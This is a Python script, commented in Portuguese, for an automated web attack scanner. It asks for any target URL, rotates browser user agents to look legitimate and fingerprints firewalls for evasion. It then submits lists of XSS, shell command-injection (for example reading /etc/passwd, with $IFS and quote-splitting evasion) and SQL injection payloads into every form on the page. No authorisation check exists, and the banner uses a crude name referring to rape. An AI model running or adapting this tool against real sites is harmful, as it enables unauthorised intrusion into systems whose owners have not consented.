import requests
import urllib.parse
from bs4 import BeautifulSoup
import re
import time
import random
import warnings
from colorama import Fore, Style, init

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
init(autoreset=True)

class VulnScanner:
    def __init__(self, target_url, delay_time=2):
        self.target_url = target_url
        self.delay_time = delay_time
        self.session = requests.Session()
        self.vulnerabilities = []
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0',
        ]
        
        self.update_headers()
        
    def update_headers(self):
        """Atualiza headers para parecer mais legítimo"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        })
    
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror=\'alert(1)\'>',
        
        '<img src=x onerror=alert(1) >',
        '<svg><script>alert(1)</script></svg>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        
        '<img/src=x/onerror=alert(1)>',
        '<img%09src=x%09onerror=alert(1)>',
    ]
    
    RCE_PAYLOADS = [
        '; ls -la',
        '| ls -la',
        '&& ls -la',
        '`ls -la`',
        '$(ls -la)',
        
        ';ls${IFS}-la',
        '|ls${IFS}-la',
        ';ls$IFS-la',
        
        ';l""s -la',
        ';l\'\'s -la',
        
        '| dir',
        '& dir',
        '&& dir',
        '| whoami',
        
        '; ping -c 3 127.0.0.1',
        '| ping -c 3 127.0.0.1',
        
        '; uname -a',
        '| uname -a',
        '`uname -a`',
        '$(uname -a)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
    ]
    
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "' OR 'a'='a",
        
        "' OR '1'='1' /*",
        "' OR 1=1#",
        "' OR 1=1;--",
        "1' OR '1'='1",
        
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        
        "'OR'1'='1",
        "'OR/**/1=1--",
        "'OR%201=1--",
        
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        
        "' AND 1=1--",
        "' AND 1=2--",
        
        "' /*!OR*/ 1=1--",
        "' OR 1=1%00",
    ]
    
    def banner(self):
        print(f"{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}  ╔═══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}  ║   God Of Estupro by Welcome                                   ║")
        print(f"{Fore.CYAN}  ╚═══════════════════════════════════════════════════════════════╝")
        print(f"{Fore.CYAN}  Target: {self.target_url}")
        print(f"{Fore.CYAN}{'='*70}\n")
    
    def delay(self):
        """Adiciona delay aleatório entre requisições"""
        time.sleep(random.uniform(self.delay_time * 0.5, self.delay_time * 1.5))
    
    def detect_waf(self, response):
        """Detecta presença de WAF"""
        waf_signatures = {
            'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'Akamai': ['akamai', 'akamaighost'],
            'Incapsula': ['incapsula', 'incap_ses', 'visid_incap'],
            'Sucuri': ['sucuri', 'x-sucuri'],
            'ModSecurity': ['mod_security', 'modsecurity'],
            'Wordfence': ['wordfence'],
            'AWS WAF': ['x-amzn-requestid', 'x-amz-'],
            'Barracuda': ['barracuda'],
            'F5 BIG-IP': ['bigip', 'f5'],
            'Qrator': ['qrator'],
        }
        
        detected_wafs = []
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        content_lower = response.text.lower()
        
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if any(sig in str(v) for v in headers_lower.values()) or sig in content_lower:
                    detected_wafs.append(waf_name)
                    break
        
        return detected_wafs
    
    def detect_server(self):
        """Detecta o servidor web e tecnologias"""
        print(f"{Fore.YELLOW}[*] Detectando servidor e tecnologias...")
        try:
            self.update_headers()
            response = self.session.get(self.target_url, timeout=15, allow_redirects=True, verify=False)
            headers = response.headers
            
            print(f"\n{Fore.GREEN}[+] Informações do Servidor:")
            print(f"  └─ Status Code: {Fore.WHITE}{response.status_code}")
            print(f"  └─ URL Final: {Fore.WHITE}{response.url}")
            
            if 'Server' in headers:
                server = headers['Server']
                print(f"  └─ Servidor: {Fore.WHITE}{server}")
            else:
                print(f"  └─ Servidor: {Fore.WHITE}Não identificado (header oculto)")
            
            wafs = self.detect_waf(response)
            if wafs:
                print(f"  └─ {Fore.RED}⚠ WAF Detectado: {', '.join(wafs)}")
                print(f"      {Fore.YELLOW}Usando técnicas de bypass...")
            
            tech_headers = {
                'X-Powered-By': 'Tecnologia',
                'X-AspNet-Version': 'ASP.NET',
                'X-AspNetMvc-Version': 'ASP.NET MVC',
                'X-Framework': 'Framework',
                'X-Generator': 'Generator',
            }
            
            for header, name in tech_headers.items():
                if header in headers:
                    print(f"  └─ {name}: {Fore.WHITE}{headers[header]}")
            
            print(f"\n{Fore.YELLOW}[*] Análise de Segurança:")
            security_headers = {
                'X-Frame-Options': 'Clickjacking',
                'X-XSS-Protection': 'XSS Filter',
                'X-Content-Type-Options': 'MIME Sniffing',
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'X-Content-Security-Policy': 'CSP (Old)',
                'Referrer-Policy': 'Referrer Policy',
                'Permissions-Policy': 'Permissions',
            }
            
            missing_headers = []
            for header, description in security_headers.items():
                if header in headers:
                    value = headers[header][:60]
                    print(f"  {Fore.GREEN}✓ {description}: {Fore.WHITE}{value}")
                else:
                    missing_headers.append(description)
            
            if missing_headers:
                print(f"  {Fore.RED}✗ Faltando: {Fore.YELLOW}{', '.join(missing_headers)}")
            
            content = response.text.lower()
            cms_signatures = {
                'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
                'Joomla': ['joomla', '/components/com_'],
                'Drupal': ['drupal', '/sites/default/', '/sites/all/'],
                'Magento': ['magento', 'mage/cookies'],
                'Django': ['csrfmiddlewaretoken', 'django'],
                'Laravel': ['laravel', 'laravel_session'],
                'PHP': ['.php', 'phpsessid'],
                'ASP.NET': ['__viewstate', 'asp.net'],
                'React': ['react', 'reactjs'],
                'Angular': ['ng-', 'angular'],
                'Vue.js': ['vue', 'v-'],
                'Next.js': ['_next', 'next.js'],
            }
            
            detected_cms = []
            for cms, signatures in cms_signatures.items():
                if any(sig in content for sig in signatures):
                    detected_cms.append(cms)
            
            if detected_cms:
                print(f"\n{Fore.GREEN}[+] Tecnologias Detectadas:")
                for cms in detected_cms:
                    print(f"  └─ {Fore.WHITE}{cms}")
            
            if response.cookies:
                print(f"\n{Fore.YELLOW}[*] Cookies Encontrados:")
                for cookie in response.cookies:
                    secure = f"{Fore.GREEN}Secure" if cookie.secure else f"{Fore.RED}Not Secure"
                    httponly = f"{Fore.GREEN}HttpOnly" if cookie.has_nonstandard_attr('HttpOnly') else f"{Fore.RED}Not HttpOnly"
                    print(f"  └─ {cookie.name}: {secure}, {httponly}")
            
            print(f"\n{Fore.YELLOW}[*] Informações Adicionais:")
            print(f"  └─ Tamanho da resposta: {Fore.WHITE}{len(response.content)} bytes")
            print(f"  └─ Tempo de resposta: {Fore.WHITE}{response.elapsed.total_seconds():.2f}s")
            
            return response
            
        except requests.exceptions.SSLError:
            print(f"{Fore.RED}[-] Erro SSL - Tentando sem verificação...")
            try:
                response = self.session.get(self.target_url, timeout=15, verify=False)
                return response
            except Exception as e:
                print(f"{Fore.RED}[-] Erro ao conectar: {e}")
                return None
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Erro ao conectar: {e}")
            return None
    
    def find_forms(self, response):
        """Encontra formulários na página"""
        soup = BeautifulSoup(response.text, 'html.parser')
        return soup.find_all('form')
    
    def get_form_details(self, form):
        """Extrai detalhes do formulário"""
        details = {}
        action = form.attrs.get('action', '').lower()
        method = form.attrs.get('method', 'get').lower()
        inputs = []
        
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            input_value = input_tag.attrs.get('value', '')
            if input_name:
                inputs.append({
                    'type': input_type, 
                    'name': input_name,
                    'value': input_value
                })
        
        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs
        
        return details
    
    def test_xss(self):
        """Testa vulnerabilidades XSS"""
        print(f"\n{Fore.YELLOW}[*] Testando XSS (Cross-Site Scripting)...")
        
        try:
            self.delay()
            response = self.session.get(self.target_url, timeout=15, verify=False)
            forms = self.find_forms(response)
            
            parsed = urllib.parse.urlparse(self.target_url)
            if parsed.query:
                print(f"{Fore.YELLOW}  [*] Testando XSS em parâmetros GET...")
                self.test_xss_get_params()
            
            if not forms:
                print(f"{Fore.BLUE}  [i] Nenhum formulário encontrado")
                return
            
            print(f"{Fore.GREEN}  [+] Encontrados {len(forms)} formulário(s)")
            vulnerabilities_found = False
            
            for i, form in enumerate(forms):
                form_details = self.get_form_details(form)
                print(f"\n  [*] Testando formulário #{i+1} ({form_details['method'].upper()})")
                
                if not form_details['inputs']:
                    print(f"    └─ Sem campos de entrada")
                    continue
                
                for payload in self.XSS_PAYLOADS:
                    self.delay()
                    data = {}
                    
                    for input_field in form_details['inputs']:
                        if input_field['type'] == 'submit':
                            data[input_field['name']] = input_field['value'] or 'Submit'
                        elif input_field['type'] in ['text', 'search', 'email', 'url']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = input_field['value'] or 'test'
                    
                    url = urllib.parse.urljoin(self.target_url, form_details['action']) if form_details['action'] else self.target_url
                    
                    try:
                        if form_details['method'] == 'post':
                            res = self.session.post(url, data=data, timeout=15, verify=False)
                        else:
                            res = self.session.get(url, params=data, timeout=15, verify=False)
                        
                        if payload in res.text:
                            print(f"{Fore.RED}    [!] VULNERABILIDADE XSS ENCONTRADA!")
                            print(f"        └─ Payload: {payload[:50]}")
                            print(f"        └─ Formulário: {url}")
                            self.vulnerabilities.append(f"XSS em {url}")
                            vulnerabilities_found = True
                            break
                        elif '<script>' in res.text and 'alert' in res.text:
                            print(f"{Fore.RED}    [!] VULNERABILIDADE XSS ENCONTRADA!")
                            print(f"        └─ Payload: {payload[:50]}")
                            print(f"        └─ Formulário: {url}")
                            self.vulnerabilities.append(f"XSS em {url}")
                            vulnerabilities_found = True
                            break
                    except Exception as e:
                        print(f"{Fore.RED}    [-] Erro ao testar: {str(e)[:50]}")
                        pass
            
            if not vulnerabilities_found:
                print(f"{Fore.GREEN}  [✓] Nenhuma vulnerabilidade XSS óbvia detectada")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Erro no teste XSS: {e}")
    
    def test_xss_get_params(self):
        """Testa XSS em parâmetros GET"""
        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name in params.keys():
            for payload in self.XSS_PAYLOADS[:3]:
                self.delay()
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    response = self.session.get(test_url, timeout=15, verify=False)
                    if payload in response.text:
                        print(f"{Fore.RED}    [!] VULNERABILIDADE XSS ENCONTRADA!")
                        print(f"        └─ Parâmetro: {param_name}")
                        print(f"        └─ Payload: {payload}")
                        self.vulnerabilities.append(f"XSS em parâmetro {param_name}")
                        return
                except:
                    pass
    
    def test_rce(self):
        """Testa vulnerabilidades RCE"""
        print(f"\n{Fore.YELLOW}[*] Testando RCE (Remote Code Execution)...")
        
        try:
            self.delay()
            response = self.session.get(self.target_url, timeout=15, verify=False)
            forms = self.find_forms(response)
            
            if not forms:
                print(f"{Fore.BLUE}  [i] Nenhum formulário encontrado")
                return
            
            vulnerabilities_found = False
            
            rce_signatures = [
                'root:x:', 'bin/bash', 'uid=', 'gid=',
                'drwxr-xr-x', 'total ', 'PING', 'packets transmitted'
            ]
            
            for i, form in enumerate(forms):
                form_details = self.get_form_details(form)
                
                for payload in self.RCE_PAYLOADS:
                    self.delay()
                    data = {}
                    
                    for input_field in form_details['inputs']:
                        if input_field['type'] == 'submit':
                            data[input_field['name']] = input_field['value'] or 'Submit'
                        elif input_field['type'] in ['text', 'search', 'email', 'url']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = input_field['value'] or 'test'
                    
                    url = urllib.parse.urljoin(self.target_url, form_details['action']) if form_details['action'] else self.target_url
                    
                    try:
                        if form_details['method'] == 'post':
                            res = self.session.post(url, data=data, timeout=15, verify=False)
                        else:
                            res = self.session.get(url, params=data, timeout=15, verify=False)
                        
                        # Verifica se alguma assinatura de RCE está presente
                        if any(sig in res.text for sig in rce_signatures):
                            print(f"{Fore.RED}    [!] POSSÍVEL VULNERABILIDADE RCE ENCONTRADA!")
                            print(f"        └─ Payload: {payload}")
                            print(f"        └─ Formulário: {url}")
                            self.vulnerabilities.append(f"RCE em {url}")
                            vulnerabilities_found = True
                            break
                    except Exception as e:
                        print(f"{Fore.RED}    [-] Erro ao testar: {str(e)[:50]}")
                        pass
            
            if not vulnerabilities_found:
                print(f"{Fore.GREEN}  [✓] Nenhuma vulnerabilidade RCE detectada")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Erro no teste RCE: {e}")
    
    def test_sql_injection(self):
        """Testa vulnerabilidades SQL Injection"""
        print(f"\n{Fore.YELLOW}[*] Testando SQL Injection...")
        
        try:
            self.delay()
            response = self.session.get(self.target_url, timeout=15, verify=False)
            forms = self.find_forms(response)
            
            if not forms:
                print(f"{Fore.BLUE}  [i] Nenhum formulário encontrado")
                return
            
            vulnerabilities_found = False
            
            for i, form in enumerate(forms):
                form_details = self.get_form_details(form)
                
                for payload in self.SQL_PAYLOADS:
                    self.delay()
                    data = {}
                    
                    for input_field in form_details['inputs']:
                        if input_field['type'] == 'submit':
                            data[input_field['name']] = input_field['value'] or 'Submit'
                        elif input_field['type'] in ['text', 'search', 'email', 'url']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = input_field['value'] or 'test'
                    
                    url = urllib.parse.urljoin(self.target_url, form_details['action']) if form_details['action'] else self.target_url
                    
                    try:
                        if form_details['method'] == 'post':
                            res = self.session.post(url, data=data, timeout=15, verify=False)
                        else:
                            res = self.session.get(url, params=data, timeout=15, verify=False)
                        
                        if 'error' in res.text.lower() or 'sql' in res.text.lower() or 'syntax' in res.text.lower():
                            print(f"{Fore.RED}    [!] POSSÍVEL VULNERABILIDADE SQL INJECTION!")
                            print(f"        └─ Payload: {payload}")
                            print(f"        └─ Formulário: {url}")
                            self.vulnerabilities.append(f"SQL Injection em {url}")
                            vulnerabilities_found = True
                            break
                        elif 'you have a syntax error' in res.text.lower():
                            print(f"{Fore.RED}    [!] POSSÍVEL VULNERABILIDADE SQL INJECTION!")
                            print(f"        └─ Payload: {payload}")
                            print(f"        └─ Formulário: {url}")
                            self.vulnerabilities.append(f"SQL Injection em {url}")
                            vulnerabilities_found = True
                            break
                    except Exception as e:
                        print(f"{Fore.RED}    [-] Erro ao testar: {str(e)[:50]}")
                        pass
            
            if not vulnerabilities_found:
                print(f"{Fore.GREEN}  [✓] Nenhuma vulnerabilidade SQL Injection detectada")
                
        except Exception as e:
            print(f"{Fore.RED}[-] Erro no teste SQL Injection: {e}")
    
    def scan(self):
        """Executa o scan completo"""
        self.banner()
        
        response = self.detect_server()
        if not response:
            return
        
        self.test_xss()
        
        self.test_rce()
        
        self.test_sql_injection()
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}  Scan concluído!")
        print(f"{Fore.CYAN}{'='*70}\n")
        
        if self.vulnerabilities:
            print(f"{Fore.RED}⚠ Vulnerabilidades Encontradas:")
            for vuln in self.vulnerabilities:
                print(f"  └─ {vuln}")
        else:
            print(f"{Fore.GREEN}[✓] Nenhuma vulnerabilidade detectada")
        
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.YELLOW} Use at your own risk.")


def main():
    print(f"{Fore.RED}{'='*70}")
    print(f"{Fore.RED}  Use at your own risk.")
    print(f"{Fore.RED}{'='*70}\n")
    
    target = input(f"{Fore.YELLOW}Digite a URL alvo (ex: http://exemplo.com): {Style.RESET_ALL}")
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    scanner = VulnScanner(target)
    scanner.scan()


if __name__ == "__main__":
    main()
